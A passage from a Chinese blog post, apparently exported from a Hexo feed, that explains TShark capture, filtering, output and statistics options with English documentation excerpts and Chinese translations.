name or idx of interface (def: first non-loopback)-f &lt;capture filter&gt; # packet filter in libpcap filter syntax-s &lt;snaplen&gt; # packet snapshot length (def: 262144)-p # don't capture in promiscuous mode-I # capture in monitor mode, if available-B &lt;buffer size&gt; # size of kernel buffer (def: 4MB)-y &lt;link type&gt; # link layer type (def: first appropriate)-D # print list of interfaces and exit-L # print list of link-layer types of iface and exit Capture stop conditions: 12345-c &lt;packet count&gt; # stop after n packets (def: infinite)-a &lt;autostop cond.&gt; ... ​ duration:NUM - stop after NUM seconds​ filesize:NUM - stop this file after NUM KB​ files:NUM - stop after NUM files Capture output: 12345-b &lt;ringbuffer opt.&gt; ... ​ duration:NUM - switch to next file after NUM secs​ filesize:NUM - switch to next file after NUM KB​ files:NUM - ringbuffer: replace after NUM files Input file: 1-r &lt;infile&gt; # set the filename to read from (no stdin!) Processing: 12345678910-2 # perform a two-pass analysis-R &lt;read filter&gt; # packet Read filter in Wireshark display filter syntax-Y &lt;display filter&gt; # packet displaY filter in Wireshark display filter syntax-n # disable all name resolutions (def: all enabled)-N &lt;name resolve flags&gt; # enable specific name resolution(s): "mnNtC"-d &lt;layer_type&gt;== &lt;selector&gt;,&lt;decode_as_protocol&gt; ... # "Decode As", see the man page for details # Example: tcp.port==8888,http-H &lt;hosts file&gt; ​ read a list of entries from a hosts file, which will then be written to a capture file. (Implies -W n) Output: 1234567891011121314151617181920212223242526272829303132333435-w &lt;outfile|-&gt; # write packets to a pcap-format file named "outfile" # (or to the standard output for "-") -C &lt;config profile&gt; # start with specified configuration profile-F &lt;output file type&gt; # set the output file type, default is pcapng # an empty "-F" option will list the file types -V # add output of packet tree (Packet Details)-O &lt;protocols&gt; # Only show packet details of these protocols, comma separated-P # print packet summary even when writing to a file-S &lt;separator&gt; # the line separator to print between packets-x # add output of hex and ASCII dump (Packet Bytes)-T pdml|ps|psml|text|fields # format of text output (def: text)-e &lt;field&gt; # field to print if -Tfields selected (e.g. tcp.port, col.Info);this option can be repeated to print multiple fields-E&lt;fieldsoption&gt;=&lt;value&gt; # set options for output when -Tfields selected: header=y|n switch headers on and off separator=/t|/s|&lt;char&gt; select tab, space, printable character as separator occurrence=f|l|a print first, last or all occurrences of each field aggregator=,|/s|&lt;char&gt; select comma, space, printable character as aggregator quote=d|s|n select double, single, no quotes for values -t a|ad|d|dd|e|r|u|ud # output format of time stamps (def: r: rel. to first)-u s|hms # output format of seconds (def: s: seconds)-l # flush standard output after each packet-q # be more quiet on stdout (e.g. when using statistics)-Q # only log true errors to stderr (quieter than -q)-g # enable group read access on the output file(s)-W n # Save extra information in the file, if supported. # n = write network address resolution information -X &lt;key&gt;:&lt;value&gt; # eXtension options, see the man page for details-z &lt;statistics&gt; # various statistics, see the man page for details Miscellaneous: 1234567-h # display this help and exit-v # display version info and exit-o &lt;name&gt;:&lt;value&gt; ... # override preference setting-K &lt;keytab&gt; # keytab file to use for kerberos decryption-G [report] # dump one of several available reports and exit # default report="fields" # use "-G ?" for more help 3.选项细节3.1 Capture interface:捕获接口-i 指定接口1-i &lt;interface&gt; # name or idx of interface (def: first non-loopback) Set the name of the network interface or pipe to use for live packet capture. 为实时数据包捕获设置网络接口或管道的名称。 Network interface names should match one of the names listed in “tshark -D“ (described above); a number, as reported by “tshark -D“, can also be used. If you’re using UNIX, “netstat -i“, “ifconfig -a“ or “ip link“ might also work to list interface names, although not all versions of UNIX support the -a option to ifconfig. 网络接口名称应该是使用“tshark -D”命令后显示的接口名称列表中的一个。当然也可以使用“tshark -D”展示的列表中的数字。如果你使用UNIX系统，“netstat -i”，“ifconfig -a”或是“iplink”也可以显示出接口名称，尽管不是所有的NUIX版本都支持在ifconfig中使用-a参数。 If no interface is specified, TShark searches the list of interfaces, choosing the first non-loopback interface if there are any non-loopback interfaces, and choosing the first loopback interface if there are no non-loopback interfaces. If there are no interfaces at all, TShark reports an error and doesn’t start the capture. 如果没有接口被指定，TShark寻找接口列表，若在列表中存在多个非回环接口，将选择第一个非回环接口。若在列表中没有非回环接口，则选择第一个回环接口。如果设备没有一个接口，那TShark会报告一个错误，并且不会开始捕获数据。 Pipe names should be either the name of a FIFO (named pipe) or “-“ to read data from the standard input. On Windows systems, pipe names must be of the form “\\pipe\.\pipename”. Data read from pipes must be in standard pcapng or pcap format. Pcapng data must have the same endianness as the capturing host. 管道名称（此处略） This option can occur multiple times. When capturing from multiple interfaces, the capture file will be saved in pcapng format. 这个选项可以出现多次。当从多个接口进行数据捕获，捕获文件将被保存为pcapng格式。 -f 设置捕获时的过滤条件1-f &lt;capture filter&gt; # packet filter in libpcap filter syntax Set the capture filter expression.设置捕获过滤器表达式 This option can occur multiple times. If used before the first occurrence of the -i option, it sets the default capture filter expression. If used after an -i option, it sets the capture filter expression for the interface specified by the last -i option occurring before this option. If the capture filter expression is not set specifically, the default capture filter expression is used if provided. 这个选项可以多次出现。如果在第一次出现-i选项之前使用，则会设置默认的捕获过滤器表达式。如果在-i选项之后使用，则会为最后一个-i选项指定的接口设置捕获过滤器表达式。如果捕获过滤器表达式没有设置指定，则使用默认的捕获过滤表达式（如果提供的话） Pre-defined capture filter names, as shown in the GUI menu item Capture-&gt;Capture Filters, can be used by prefixing the argument with “predef:”. Example: tshark -f “predef:MyPredefinedHostOnlyFilter” 通过在参数前面添加前缀”predef:”可以使用预定义捕获过滤器名称，就像在GUI菜单选项 Capture-&gt;Capture Filters中一样。举个例子：tshark -f “predef:MyPredefinedHostOnlyFilter” ps：捕获过滤器条件写法参考自己之前做的总结文档 -s 设置捕获的数据包长度1-s &lt;snaplen&gt; # packet snapshot length (def: 262144) Set the default snapshot length to use when capturing live data. No more than snaplen bytes of each network packet will be read into memory, or saved to disk. A value of 0 specifies a snapshot length of 262144, so that the full packet is captured; this is the default. 当在捕获实时数据时，设置一个默认的快照长度。每个网络数据包的快照字节将会读入到内存或是保存在硬盘中。 数值0指定了快照长度是262144字节，以便捕获完整数据包；这个也是默认的。 This option can occur multiple times. If used before the first occurrence of the -i option, it sets the default snapshot length. If used after an -i option, it sets the snapshot length for the interface specified by the last -i option occurring before this option. If the snapshot length is not set specifically, the default snapshot length is used if provided. 这个选项能出现多次。如果在第一次出现-i选项前使用，则将设置默认的快照长度。如果在-i选项后使用，则将为最后一个出现的-i选项所指定的接口设置快照长度。如果快照长度没有被指定，则使用默认的快照长度（如果被提供的话） -p 设置接口为非混杂模式1-p # don't capture in promiscuous mode Don’t put the interface into promiscuous mode. Note that the interface might be in promiscuous mode for some other reason; hence, -p cannot be used to ensure that the only traffic that is captured is traffic sent to or from the machine on which TShark is running, broadcast traffic, and multicast traffic to addresses received by that machine. 不让接口成为混杂模式。 This option can occur multiple times. If used before the first occurrence of the -i option, no interface will be put into the promiscuous mode. If used after an -i option, the interface specified by the last -i option occurring before this option will not be put into the promiscuous mode. 这个选项能出现多次。如果在第一次出现-i选项前使用，那么没有接口会被设置为混杂模式。如果在-i选项后被使用，那么在-p选项前的最后一个-i选项指定的接口将不会被设置为混杂模式。 -I 为IEEE802.11设置监控模式1-I # capture in monitor mode, if available Put the interface in “monitor mode”; this is supported only on IEEE 802.11 Wi-Fi interfaces, and supported only on some operating systems. 设置为监控模式；这仅在IEEE802.11 Wi-Fi接口和某些操作系统上支持。 -B 设置捕获缓冲区大小1-B &lt;buffer size&gt; # size of kernel buffer (def: 4MB) Set capture buffer size (in MiB, default is 2 MiB). 设置捕获缓冲区大小，TSshark官方文档中说默认是2MB。在我这台Linux服务器显示是4MB -y 设置数据链路类型1-y &lt;link type&gt; # link layer type (def: first appropriate) Set the data link type to use while capturing packets. The values reported by -L are the values that can be used. 当在捕获数据包时，设置数据链路类型。能够使用的值在-L参数中被展示 This option can occur multiple times. If used before the first occurrence of the -i option, it sets the default capture link type. If used after an -i option, it sets the capture link type for the interface specified by the last -i option occurring before this option. If the capture link type is not set specifically, the default capture link type is used if provided. -D 输出接口列表1-D # print list of interfaces and exit -L 显示数据链路类型1-L # print list of link-layer types of iface and exit 3.2 Capture stop conditions:捕获停止选项-c 在N个数据包后停止捕获1-c &lt;packet count&gt; # stop after n packets (def: infinite) Set the maximum number of packets to read when capturing live data. If reading a capture file, set the maximum number of packets to read. 在捕获实时数据时，设置一个最大的数据包读取数。如果是在读取捕获文件，依旧是要设置一个读取数据包的数量。第一张图是实时捕获的情况，第二张图是读取http_google.pcap文件只看前3个包的情况。 -a 设置停止捕获条件12345-a &lt;autostop cond.&gt; ... ​ duration:NUM - stop after NUM seconds​ filesize:NUM - stop this file after NUM KB​ files:NUM - stop after NUM files Specify a criterion that specifies when TShark is to stop writing to a capture file. The criterion is of the form test:value, where test is one of: 指定一个标准，指定TShark何时停止写入捕获文件。标准的写法是test：value，其中test是以下之一 duration:value Stop writing to a capture file after value seconds have elapsed. Floating point values (e.g. 0.5) are allowed. duration:value 经过value秒后停止捕获文件。duration是持续时间的意思。浮点数值也是被允许的（比如0.5）。下图测试，确实在1s后停止捕获，同时还告诉你6个包被捕获到了 files:value Stop writing to capture files after value number of files were written. files:value 在捕获value个文件后，就停止捕获 filesize:value Stop writing to a capture file after it reaches a size of value kB. If this option is used together with the -b option, TShark will stop writing to the current capture file and switch to the next one if filesize is reached. When reading a capture file, TShark will stop reading the file after the number of bytes read exceeds this number (the complete packet will be read, so more bytes than this number may be read). Note that the filesize is limited to a maximum value of 2 GiB. filesize:value 在达到value kB的大小后停止写入捕获文件。如果此选项与-b选项一起使用，则TShark将停止写入当前捕获文件，并在达到文件大小时切换到下一个文件。读取捕获文件时，TShark将在读取的字节数超过此数字后停止读取该文件（因为要读取完整数据包，所以可能会读取出超出这个数值的字节数）。请注意，文件大小限制为2 GiB。 3.3 Capture output:捕获输出-b 设置循环写入多个数据包条件1234-b &lt;ringbuffer opt.&gt; ... ​ duration:NUM - switch to next file after NUM secs​ filesize:NUM - switch to next file after NUM KB​ files:NUM - ringbuffer: replace after NUM files Cause TShark to run in “multiple files” mode. In “multiple files” mode, TShark will write to several capture files. When the first capture file fills up, TShark will switch writing to the next file and so on. 导致TShark使用“多文件”模式运行。在“多文件”模式下，TShark将写入多个捕获文件。当第一个捕获文件写满，TShark将切换写入到下一个文件，以此类推。 The created filenames are based on the filename given with the -w option, the number of the file and on the creation date and time, e.g. outfile_00001_20190714120117.pcap, outfile_00002_20190714120523.pcap, … 被创建的这些文件名是基于-w选项所给出的“文件名，文件的编号以及在创建时的数据和时间”。例如 outfile_00001_20190714120117.pcap，outfile_00002_20190714120523.pcap, … With the files option it’s also possible to form a “ring buffer”. This will fill up new files until the number of files specified, at which point TShark will discard the data in the first file and start writing to that file and so on. If the files option is not set, new files filled up until one of the capture stop conditions match (or until the disk is full). 使用files选项还可以形成“环形缓冲区”。这将填充新文件直到所指定的文件数。在这一点上，TShark将丢弃在第一个文件中的数据并开始把数据写入另一个文件中，以此类推。如果files选项没有被设置，则将填满新文件，直到其中一个捕获停止条件匹配为止（或是直到硬盘被填满）。 The criterion is of the form key:value, where key is one of: 标准格式是key:value，key是以下参数中的一个： duration:value switch to the next file after value seconds have elapsed, even if the current file is not completely filled up. Floating point values (e.g. 0.5) are allowed. duration:value 在经过value秒后切换到下一个文件，即便现在的文件没有被完全填满。浮点数值（例如0.5）也是可以使用的。 files:value begin again with the first file after value number of files were written (form a ring buffer). This value must be less than 100000. Caution should be used when using large numbers of files: some filesystems do not handle many files in a single directory well. The files criterion requires either duration, interval or filesize to be specified to control when to go to the next file. It should be noted that each -b parameter takes exactly one criterion; to specify two criterion, each must be preceded by the -b option. files:value 在value个文件数被写入后，再次从第一个文件开始（形成环形缓冲区）。这个数值必须小于100000。当使用大量的文件数时，需要谨慎使用：因为一些文件系统不能在当个的目录下处理好大量的文件。文件标准要求指定持续时间，间隔或文件大小以控制何时转到下一个文件。需要注意的是每个-b参数只使用一个标准；想要使用两个标准，那么每个标准前都要加上-b参数 filesize:value switch to the next file after it reaches a size of value kB. Note that the filesize is limited to a maximum value of 2 GiB. filesize:value 在到达value kB后，切换到下一个文件。需要注意的是文件大小被限制在2GB以下。 3.4 Input file:读取本地文件-r1-r &lt;infile&gt; # set the filename to read from (no stdin!) 3.5 Processing:处理过程-2 执行2次分析1-2 # perform a two-pass analysis 执行两次分析 -R 设置显示过滤器1-R &lt;read filter&gt; # packet Read filter in Wireshark display filter syntax Cause the specified filter (which uses the syntax of read/display filters, rather than that of capture filters) to be applied during the first pass of analysis. Packets not matching the filter are not considered for future passes. Only makes sense with multiple passes, see -2. For regular filtering on single-pass dissect see -Y instead. 在第一遍分析中使用指定过滤器（该过滤器使用的是读取/显示过滤器的语法，而不是捕获过滤器的语法）。没有匹配过滤器的数据包将不会在后续展示。-R对于数据包进行多次分析才有意义，可以参考-2。对于单次的常规分析详见-Y。 -Y 设置显示过滤器（单次分析）1-Y &lt;display filter&gt; # packet displaY filter in Wireshark display filter syntax Cause the specified filter (which uses the syntax of read/display filters, rather than that of capture filters) to be applied before printing a decoded form of packets or writing packets to a file. Packets matching the filter are printed or written to file; packets that the matching packets depend upon (e.g., fragments), are not printed but are written to file; packets not matching the filter nor depended upon are discarded rather than being printed or written. 在输出数据包的解码形式或写入数据包到文件前，使用指定的过滤器（过滤器使用读取/显示过滤器的语法，而不是捕获过滤器）。匹配过滤的数据包将输出或是写入到文件；基于匹配的数据包（例如：数据段），将不会输出但是会写入到文件；不匹配过滤器的数据包被丢弃而不是被打印或写入。 Use this instead of -R for filtering using single-pass analysis. If doing two-pass analysis (see -2) then only packets matching the read filter (if there is one) will be checked against this filter. 对于过滤时使用-R将进行单次分析。如果做2次分析（见-2），那么只有数据包匹配了读取过滤器（如果有的话），将会针对这个过滤器再次检查。 -n 设置不做名称解析1-n # disable all name resolutions (def: all enabled) Disable network object name resolution (such as hostname, TCP and UDP port names); the -N option might override this one. 关闭所有名称解析（例如主机名，TCP和UDP的端口名）；-N选项将覆盖-n选项。 -N 设置只为特定情况做名称解析1-N &lt;name resolve flags&gt; # enable specific name resolution(s): "mnNtC" Turn on name resolving only for particular types of addresses and port numbers, with name resolving for other types of addresses and port numbers turned off. This option overrides -n if both -N and -n are present. If both -N and -n options are not present, all name resolutions are turned on. 只为特定的地址和端口号类型打开名称解析，对于没有指定的则不进行地址解析。如果-N和-n选项同时出现，则会覆盖-n选项。如果-N和-n选项都没出现，则名称解析会被开启。 The argument is a string that may contain the letters: 参数是包含以下字母的字符串 d to enable resolution from captured DNS packets 从捕获的DNS数据包中开始解析 m to enable MAC address resolution 开启MAC地址解析 n to enable network address resolution 开启网络地址解析 N to enable using external resolvers (e.g., DNS) for network address resolution 使用外部解析器（如DNS）来对网络地址进行解析 t to enable transport-layer port number resolution 开启传输层端口号解析 v to enable VLAN IDs to names resolution 开启VLAN ID的名称解析 -d 设置解码格式123-d &lt;layer_type&gt;== &lt;selector&gt;,&lt;decode_as_protocol&gt; ... # "Decode As", see the man page for details # Example: tcp.port==8888,http Like Wireshark’s Decode As… feature, this lets you specify how a layer type should be dissected. If the layer type in question (for example, tcp.port or udp.port for a TCP or UDP port number) has the specified selector value, packets should be dissected as the specified protocol. 类似于Wireshark的Decode As…这个功能让你指定如何对每层类型进行分析。如果请求的层次类型（如TCP或是UDP端口号中的tcp.port 、udp.port ）有指定的选择值，则数据包将会使用指定的协议进行分析。 Example: tshark -d tcp.port==8888,http will decode any traffic running over TCP port 8888 as HTTP. 例如：tshark -d tcp.port==8888,http将会解码每一个TCP端口号是8888的流量为HTTP协议。 Example: tshark -d tcp.port==8888:3,http will decode any traffic running over TCP ports 8888, 8889 or 8890 as HTTP. 例如：tshark -d tcp.port==8888:3,http将会解码每一个TCP端口号是8888，8889,8890的流量为HTTP协议。 Example: tshark -d tcp.port==8888-8890,http will decode any traffic running over TCP ports 8888, 8889 or 8890 as HTTP. 含义同上，只是写法有区别 Using an invalid selector or protocol will print out a list of valid selectors and protocol names, respectively. 使用无效的解析器或协议将会分别打印出有效解析器和协议名称的表。 Example: tshark -d . is a quick way to get a list of valid selectors. 例如：tshark -d .以最快的方式列出有效解析器 Example: tshark -d ethertype==0x0800. is a quick way to get a list of protocols that can be selected with an ethertype. 例如：tshark -d ethertype==0x0800.以最快的方式获取能选择的以太网类型的协议列表 -H12-H &lt;hosts file&gt; ​ read a list of entries from a hosts file, which will then be written to a capture file. (Implies -W n) Read a list of entries from a “hosts” file, which will then be written to a capture file. Implies -W n. Can be called multiple times. 从“hosts”文件中读取条目列表，然后将其写入捕获文件。也可以使用-W n。可以多次调用。 3.6 Output:输出-w 写入文件12-w &lt;outfile|-&gt; # write packets to a pcap-format file named "outfile" # (or to the standard output for "-") Write raw packet data to outfile or to the standard output if outfile is ‘-‘. 在标准输出或是输出文件中写入原始数据包 NOTE: -w provides raw packet data, not text. If you want text output you need to redirect stdout (e.g. using ‘&gt;’), don’t use the -w option for this. 注意：-w提供的是原始数据包，而非文本。如果你想输出文本，你需要重定向（例如使用‘&gt;’），而非使用-w选项。 -F 设置写入文件格式12-F &lt;output file type&gt; # set the output file type, default is pcapng # an empty "-F" option will list the file types Set the file format of the output capture file written using the -w option. The output written with the -w option is raw packet data, not text, so there is no -F option to request text output. The option -F without a value will list the available formats. 使用-w选项设置输出捕获文件写入的文件格式。使用-w选项写入的输出是原始数据包而非文本。-F选项后不接值，则将列出可获得的格式。 -V（大写V，显示数据包细节）1-V # add output of packet tree (Packet Details) Cause TShark to print a view of the packet details. -O 显示此选项指定的协议的详细信息1-O &lt;protocols&gt; # Only show packet details of these protocols, comma separated Similar to the -V option, but causes TShark to only show a detailed view of the comma-separated list of protocols specified, and show only the top-level detail line for all other protocols, rather than a detailed view of all protocols. Use the output of “tshark -G protocols“ to find the abbreviations of the protocols you can specify. 类似于-V，只是TShark仅显示指定协议的以逗号分隔开的协议细节。同时仅为其他的协议显示顶层细节行，而非全体细节。使用 “tshark -G protocols“ 你可以获得可以指定的协议列表。 -T 与-e一起使用，显示相应的特定内容1-T pdml|ps|psml|text|fields # format of text output (def: text) Set the format of the output when viewing decoded packet data. The options are one of: 当在查看解码数据包数据时设置输出格式。选项可以为以下之一（我只列出常用的）： fields The values of fields specified with the -e option, in a form specified by the -E option. For example, fields 使用-e选项指定字段的值，采用-E选项指定格式。例如， 1tshark -T fields -E separator=, -E quote=d -e1-e &lt;field&gt; # field to print if -Tfields selected (e.g. tcp.port, col.Info);this option can be repeated to print multiple fields Add a field to the list of fields to display if -T ek|fields|json|pdml is selected. This option can be used multiple times on the command line. At least one field must be provided if the -T fields option is selected. 如果选择了-T ek|fields|json|pdml，则添加一个字段来显示字段列表。在命令行，这个选项可以使用多次。如果使用的是 -T fields ，则至少要提供一个字段。 Example: *tshark -e frame.number -e ip.addr -e udp * 例如：*tshark -e frame.number -e ip.addr -e udp * Giving a protocol rather than a single field will print multiple items of data about the protocol as a single field. Fields are separated by tab characters by default. -E controls the format of the printed fields. 给定一个协议而不是单个字段，将会打印出这个协议作为单个字段的多个项目数据。字段默认情况下会被制表符分隔。-E控制打印字段的格式。 -E 设置控制字段打印的选项123456-E&lt;fieldsoption&gt;=&lt;value&gt; # set options for output when -Tfields selected: header=y|n switch headers on and off separator=/t|/s|&lt;char&gt; select tab, space, printable character as separator occurrence=f|l|a print first, last or all occurrences of each field aggregator=,|/s|&lt;char&gt; select comma, space, printable character as aggregator quote=d|s|n select double, single, no quotes for values -t 设置时间显示格式1-t a|ad|d|dd|e|r|u|ud # output format of time stamps (def: r: rel. to first) -u 设置秒的类型1-u s|hms # output format of seconds (def: s: seconds) Specifies the seconds type. Valid choices are: s for seconds hms for hours, minutes and seconds -W n12-W n # Save extra information in the file, if supported. # n = write network address resolution information Save extra information in the file if the format supports it. For example, 如果格式支持，则保存额外的信息到文件中。例如，使用如下命令 1tshark -F pcapng -W n will save host name resolution records along with captured packets. 则将保存主机名称解析的解码到捕获数据包中。 Future versions of Tshark may automatically change the capture format to pcapng as needed. 未来版本的Tshark可能会根据需要自动将捕获格式更改为pcapng。 The argument is a string that may contain the following letter: n write network address resolution information (pcapng only) 参数可以是以下的字符串： n 写入网络地址解析信息(仅限pcapng) -q与-z 获取各种统计信息（只挑选了部分常用的）12-q # be more quiet on stdout (e.g. when using statistics)-z &lt;statistics&gt; # various statistics, see the man page for details Get TShark to collect various types of statistics and display the result after finishing reading the capture file. Use the -q option if you’re reading a capture file and only want the statistics printed, not any per-packet information. 让TShark收集统计的各种类型，并且在完成读取的捕获文件后展示出来。如果你正在读取捕获文件，并只想打印出统计信息，而不是每个包的信息，则使用-q选项。 Note that the -z proto option is different - it doesn’t cause statistics to be gathered and printed when the capture is complete, it modifies the regular packet summary output to include the values of fields specified with the option. Therefore you must not use the -q option, as that option would suppress the printing of the regular packet summary output, and must also not use the -V option, as that would cause packet detail information rather than packet summary information to be printed. 注意的是-z proto有不同之处。当在捕获完成时，它不会收集统计信息并打印出来，而是修改常规数据包汇总输出，包括选项中指定字段的数值。因此，你不能使用-q选项，因为该选项会禁止打印常规数据包的汇总输出。同时，也不能使用-V选项，因为这会导致数据包的细节信息被打印出来，而非数据包的汇总信息。 Currently implemented statistics are:目前实现的统计有如下内容： -z help Display all possible values for -z. 显示所有可能的数值 -z afp,srt[,filter] Show Apple Filing Protocol service response time statistics. 显示AFP服务器响应时间统计 -z conv,type[,filter] Create a table that lists all conversations that could be seen in the capture. type specifies the conversation endpoint types for which we want to generate the statistics; currently the supported ones are: 创建一个表，里面包含了所有统计信息，这些信息可以在捕获中看到。type指定了我们想要生成的统计信息的会话终端类型。目前支持的内容如下： 12345678910111213141516"bluetooth" Bluetooth addresses"eth" Ethernet addresses"fc" Fibre Channel addresses"fddi" FDDI addresses"ip" IPv4 addresses"ipv6" IPv6 addresses"ipx" IPX addresses"jxta" JXTA message addresses"ncp" NCP connections"rsvp" RSVP connections"sctp" SCTP addresses"tcp" TCP/IP socket pairs Both IPv4 and IPv6 are supported"tr" Token Ring addresses"usb" USB addresses"udp" UDP/IP socket pairs Both IPv4 and IPv6 are supported"wlan" IEEE 802.11 addresses If the optional filter is specified, only those packets that match the filter will be used in the calculations. 如果指定了filter，则在计算时会使用匹配了过滤条件的这些数据包。 The table is presented with one line for each conversation and displays the number of packets/bytes in each direction as well as the total number of packets/bytes. The table is sorted according to the total number of frames. 这个表会为每个会话显示一行，并且显示每个方向的数据包/字节的数目及其总数。该表会依据数据帧数进行排序。 -z bootp,stat[,filter] Show DHCP (BOOTP) statistics. 显示DHCP统计信息 -z dns,tree[,filter] Create a summary of the captured DNS packets. General information are collected such as qtype and qclass distribution. For some data (as qname length or DNS payload) max, min and average values are also displayed. 为捕获的DNS数据包创建一个汇总。核心信息包含了如qtype，qclass distribution。对于一些数据（如qname长度或是DNS负载）的最大，最小，平均值也会被显示出来。 -z endpoints,type[,filter] Create a table that lists all endpoints that could be seen in the capture. type specifies the endpoint types for which we want to generate the statistics; currently the supported ones are: 12345678910111213141516"bluetooth" Bluetooth addresses"eth" Ethernet addresses"fc" Fibre Channel addresses"fddi" FDDI addresses"ip" IPv4 addresses"ipv6" IPv6 addresses"ipx" IPX addresses"jxta" JXTA message addresses"ncp" NCP connections"rsvp" RSVP connections"sctp" SCTP addresses"tcp" TCP/IP socket pairs Both IPv4 and IPv6 are supported"tr" Token Ring addresses"usb" USB addresses"udp" UDP/IP socket pairs Both IPv4 and IPv6 are supported"wlan" IEEE 802.11 addresses If the optional filter is specified, only those packets that match the filter will be used in the calculations（计算）.The table is presented with one line for each conversation and displays the number of packets/bytes in each direction as well as the total number of packets/bytes. The table is sorted according to the total number of frames. 与-z conv,type[,filter]类似 -z expert [,error|,warn|,note|,chat|,comment*][,filter*] Collects information about all expert info, and will display them in order, grouped by severity. Example: -z expert,sip will show expert items of all severity for frames that match the sip protocol. This option can be used multiple times on the command line. 收集所有的expert info专家信息，并按顺序及重要性分组来显示他们。 例如: -z expert,sip 将显示与sip协议匹配的帧的所有重要专家项。 If the optional filter is provided, the stats will only be calculated on those calls that match that filter. Example: -z “expert,note,tcp” will only collect expert items for frames that include the tcp protocol, with a severity of note or higher. 如果提供了filter，则只会根据与该过滤器匹配的调用计算统计信息。 例如：-z “expert,note,tcp” 将仅收集note或更高层级的包含了tcp协议的数据帧的专家项 -z flow,name,mode,[filter] Displays the flow of data between two nodes. Output is the same as ASCII format saved from GUI. name specifies the flow name. It can be one of: 显示在两端的数据流。输出与从GUI保存的ASCII格式相同。 12345any All framesicmp ICMPicmpv6 ICMPv6lbm_uim UIMtcp TCP mode specifies the address type. It can be one of: mode 指定了地址类型。可以是以下之一 12standard Any addressnetwork Network address Example: -z flow,tcp,network will show data flow for all TCP frame 例如： -z flow,tcp,network将展示所有TCP帧的数据流 -z follow,prot,mode,filter[,range] Displays the contents of a TCP or UDP stream between two nodes. 展示在两端的TCP或是UDP流的内容。 prot specifies the transport protocol. It can be one of: 123tcp TCPudp UDPtls TLS or SSL mode specifies the output mode. It can be one of: 1234ascii ASCII output with dots for non-printable charactersebcdic EBCDIC output with dots for non-printable charactershex Hexadecimal and ASCII data with offsetsraw Hexadecimal data filter specifies the stream to be displayed. UDP/TCP streams are selected with either the stream index or IP address plus port pairs. TLS streams are selected with the stream index. For example: 12ip-addr0:port0,ip-addr1:port1stream-index range optionally specifies which “chunks” of the stream should be displayed. Example: -z “follow,tcp,hex,1” will display the contents of the second TCP stream (the first is stream 0) in “hex” format. 例如： -z “follow,tcp,hex,1”将会使用“hex”格式展示第二个TCP流的内容（第一个是stream 0） 1234567891011&gt; ===================================================================&gt; Follow: tcp,hex&gt; Filter: tcp.stream eq 1&gt; Node 0: 200.57.7.197:32891&gt; Node 1: 200.57.7.198:2906&gt; 00000000 00 00 00 22 00 00 00 07 00 0a 85 02 07 e9 00 02 ...&quot;.... ........&gt; 00000010 07 e9 06 0f 00 0d 00 04 00 00 00 01 00 03 00 06 ........ ........&gt; 00000020 1f 00 06 04 00 00 ......&gt; 00000000 00 01 00 00 ....&gt; 00000026 00 02 00 00&gt; Example: -z “follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906” will display the contents of a TCP stream between 200.57.7.197 port 32891 and 200.57.7.98 port 2906. 例如：-z “follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906”将会展示200.57.7.197的32891端口与200.57.7.98的2906端口的TCP流的内容 1234567891011&gt; ===================================================================&gt; Follow: tcp,ascii&gt; Filter: (omitted for readability)&gt; Node 0: 200.57.7.197:32891&gt; Node 1: 200.57.7.198:2906&gt; 38&gt; ...&quot;.....&gt; ................&gt; 4&gt; ....&gt; -z hosts [,ipv4][,ipv6] Dump any collected IPv4 and/or IPv6 addresses in “hosts” format. Both IPv4 and IPv6 addresses are dumped by default.Addresses are collected from a number of sources, including standard “hosts” files and captured traffic. -z http,stat, Calculate the HTTP statistics distribution. Displayed values are the HTTP status codes and the HTTP request methods. -z http,tree Calculate the HTTP packet distribution. Displayed values are the HTTP request modes and the HTTP status codes. -z http_srv,tree Calculate the HTTP requests and responses by server. For the HTTP requests, displayed values are the server IP address and server hostname. For the HTTP responses, displayed values are the server IP address and status. -z icmp,srt[,filter] Compute total ICMP echo requests, replies, loss, and percent loss, as well as minimum, maximum, mean, median and sample standard deviation SRT statistics typical of what ping provides. Example: -z icmp,srt,ip.src==1.2.3.4 will collect ICMP SRT statistics for ICMP echo request packets originating from a specific host.This option can be used multiple times on the command line. 计算总的ICMP回应请求，回复，丢失和百分比损失，以及ping提供的典型的最小值，最大值，平均值，中值和样本标准差SRT统计量。 例如：-z icmp,srt,ip.src==1.2.3.4将收集源自特定主机的ICMP回送请求数据包的ICMP SRT统计信息。可以在命令行上多次使用此选项。 -z io,phs[,filter] Create Protocol Hierarchy Statistics listing both number of packets and bytes. If no filter is specified the statistics will be calculated for all packets. If a filter is specified statistics will only be calculated for those packets that match the filter.This option can be used multiple times on the command line. 创建一个包含所有数据包和字节数的协议分层信息列表。 -z io,stat,interval[,filter][,filter][,filter]… Collect packet/bytes statistics for the capture in intervals of interval seconds. Interval can be specified either as a whole or fractional second and can be specified with microsecond (us) resolution. If interval is 0, the statistics will be calculated over all packets. 按时间间隔秒数收集捕获的数据包/字节数统计信息。时间间隔可以指定为整数或小数秒，并且可以使用微秒（us）。如果interval为0，则将计算所有数据包的统计信息。 If no filter is specified the statistics will be calculated for all packets.If one or more filters are specified statistics will be calculated for all filters and presented with one column of statistics for each filter. This option can be used multiple times on the command line. 如果没有指定过滤条件，则计算所有数据包的统计信息。如果一个或多个过滤条件被指定，那么会为所有的过滤条件来计算统计信息，并为每个过滤条件显示一列统计信息。可以在命令行上多次使用此选项。 Example: -z io,stat,1,ip.addr==1.2.3.4 will generate 1 second statistics for all traffic to/from host 1.2.3.4. 例如： -z io,stat,1,ip.addr==1.2.3.4 将为所有进出主机1.2.3.4的流量生成1秒的统计信息 Example: -z “io,stat,0.001,smb&amp;&amp;ip.addr==1.2.3.4” will generate 1ms statistics for all SMB packets to/from host 1.2.3.4. 例如： -z io,stat,1,smb&amp;&amp;ip.addr==1.2.3.4 将为所有进出主机1.2.3.4的SMB流量生成1毫秒的统计信息 The examples above all use the standard syntax for generating statistics which only calculates the number of packets and bytes in each interval. 上面的示例都使用标准语法来生成统计信息，该统计信息仅计算每个间隔中的数据包和字节数。 -z io,stat,interval,”[COUNT|SUM|MIN|MAX|AVG|LOAD](field)filter“ io,stat can also do much more statistics and calculate COUNT(), SUM(), MIN(), MAX(), AVG() and LOAD() using a slightly different filter syntax: io,stat还能做更多的统计和计算。如COUNT(), SUM(), MIN(), MAX(), AVG() and LOAD()，这些使用稍微不同的过滤器语法。]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用github+hexo创建一个博客]]></title>
